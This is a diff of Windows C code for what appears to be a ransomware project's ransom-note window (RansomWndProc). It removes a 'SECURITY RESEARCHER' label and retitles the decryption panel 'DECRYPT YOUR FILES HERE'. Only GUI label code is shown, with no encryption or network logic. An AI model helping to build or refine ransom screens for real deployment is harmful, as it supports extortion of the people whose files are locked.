@@ -228,9 +228,6 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
         CreateWindowExW(0, L"STATIC", NULL, WS_CHILD | WS_VISIBLE,
             0, 0, 5, 85, hCard, NULL, hInst, NULL);
 
-        CreateWindowExW(0, L"STATIC", L"SECURITY RESEARCHER",
-            WS_CHILD | WS_VISIBLE, 20, 8, 300, 18, hCard, NULL, hInst, NULL);
-
         CreateWindowExW(0, L"STATIC", L"Jahanzaib Ashraf Mir",
             WS_CHILD | WS_VISIBLE, 20, 28, 500, 32, hCard, NULL, hInst, NULL);
 
@@ -243,7 +240,7 @@ static LRESULT CALLBACK RansomWndProc(HWND hWnd, UINT msg, WPARAM wParam, LPARAM
             WS_CHILD | WS_VISIBLE | SS_NOTIFY,
             30, 460, 800, 130, hWnd, NULL, hInst, NULL);
 
-        CreateWindowExW(0, L"STATIC", L"\u26A0  DECRYPTION UTILITY",
+        CreateWindowExW(0, L"STATIC", L"\u26A0  DECRYPT YOUR FILES HERE: ",
             WS_CHILD | WS_VISIBLE, 15, 5, 300, 22, hDecryptPanel, NULL, hInst, NULL);
 
         CreateWindowExW(0, L"STATIC",
